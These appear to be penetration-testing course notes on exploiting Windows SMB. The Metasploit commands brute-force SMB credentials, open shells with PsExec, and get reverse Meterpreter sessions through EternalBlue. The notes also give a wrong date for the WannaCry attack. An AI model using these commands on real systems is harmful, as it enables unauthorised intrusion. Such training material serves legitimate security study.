# 2 - Exploiting SMB with PsExec

## **SMB**

* SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (printers and serial ports) between computers on a local network (LAN).
* SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
* SAMBA is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

## **SMB Authentication**

The SMB protocol utilizes two levels of authentication, namely:

* **User authentication** - Users must provide a username and password in order to authenticate with SMB server in order to access the share.
* **Share authentication** - Users must provide a password in order to access restricted share.

## **PsExec**

* PsExec is a lightweight telnet-replacement developed by Microsoft that allows you to execute processes on remote windows systems using any user's credentials.
* PsExec authentication is performed via SMB.
* We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.
* It is very similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.

## **SMB Exploitation With PsExec**

* In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate user accounts and their respective passwords or password hashes.
* This can be done by leveraging various tools and techniques, however, the most common technique will involve performing an SMB login brute-force attack.
* We can narrow down our brute-force attack to only include common Windows user accounts like:
  * Administrator
* After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.



## **Practical Demonstration**

`nmap -sV -sC $ip` - basic scan to check for smb.

```bash
# Bruteforcing login creds
service postgresql start && msfconsole
search smb_login
use auxiliary/scanner/smb/smb_login
set RHOST $ip
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common-users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
set verbose false
set STOP_ON_SUCCESS true
show options  # verify options
run
```

### Using \[psexec.py] tool to authenticate SMB creds

`psexec.py Administrator@$ip cmd.exe` - authenticate the SMB credentials and also run the cmd.exe cmd which launches a windows cmd shell session for us. type `whoami` and we gained admin privilege.

## Getting a Meterpreter session with Metasploit using \[psexec]

Antivirus might detect this, because we are essentiall uploading a payload into the victim PC, though using the "psexec.py" utility above is perfectly fine.

```bash
# search psexec
use exploit/windows/smb/psexec
set RHOSTS $ip
set SMBuser Administrator
set SMBPass quertyuiop
set LHOST $kali_ip
set LPORT 4444
run
# and we get a meterpreter session.
sysinfo  # to get sys information.
whoami
```



## Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)

### **MS17-010 EternalBlue Exploit**

* &#x20;EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of Windows vulnerabilities and exploits that allows attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
* The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadow Brokers in 2017.
* The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.
* The EternalBlue exploit was used in the WannaCry ransomware attack on June 27 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.
* This vulnerability affects multiple versions of Windows:
  * Windows Vista
  * Windows 7
  * Windows Server 2008
  * Windows 8.1
  * Windows Server 2012
  * Windows 10
  * Windows Server 2016
* Microsoft released a patch for the vulnerability in March 2017, however, many users and companies have still not yet patched their systems.
* The EternalBlue exploit has a MSF auxiliary module that can be used to check if a target system if vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems.
* The EternalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.
* In addition to MSF modules, we can also manually exploit the vulnerability by utilizing publicly available exploit code.

### **Tools & Environment**

* Auto-Blue-MS17-010: [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
* Target system: Windows Server 2008 R2
* Penetration Testing distribution: Kali Linux



## **Practical Demonstration**

`sudo nmap -sV -p 445 -O $ip` - normal scan.

`sudo nmap -sV -p445 --script=smb-vuln-ms17-010 $ip` - Perform a scan while checking if the target is vulnerable to the EternalBlue exploit.

### Exploit Manually

[https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010) - using this script, clone the repo, install the requirements, follow the steps.

### Exploit Automatically

```bash
use exploit/windows/smb/ms17_010_eternalblue
options
set RHOSTS $ip
set LHOST $kali
set LPORT 4444
run
# we get a meterpreter.
getuid
sysinfo # NT\Authority
```



